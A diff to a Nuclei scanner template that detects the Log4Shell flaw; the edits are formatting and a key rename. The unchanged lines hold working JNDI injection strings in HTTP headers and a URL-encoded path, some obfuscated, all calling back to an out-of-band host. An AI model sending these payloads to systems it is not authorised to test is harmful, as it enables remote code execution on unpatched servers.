@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: log4shell
 
 info:
@@ -6,10 +7,10 @@ info:
   description: Log4Shell vulnerability
   severity: critical
   tags: cve,cve2021,rce,log4shell
-  reference: 
+  reference:
     - https://bin3xish477.medium.com/log4shell-zero-day-exploit-walkthrough-f42352612ca6
 
-requests:
+http:
   - raw:
     - |
       GET / HTTP/1.1
@@ -18,7 +19,7 @@ requests:
       X-Api-Version: ${jndi:ldap://{{interactsh-url}}/teste}
       User-Agent: ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://{{interactsh-url}}/teste}
       Referer: ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://{{interactsh-url}}/teste}
-    
+
     - |
       GET %24%7B%24%7B%3A%3A-j%7D%24%7B%3A%3A-n%7D%24%7B%3A%3A-d%7D%24%7B%3A%3A-i%7D%3A%24%7B%3A%3A-l%7D%24%7B%3A%3A-d%7D%24%7B%3A%3A-a%7D%24%7B%3A%3A-p%7D%3A%2F%2F{{interactsh-url}}%2Fteste%7D HTTP/1.1
       Host: {{Hostname}}
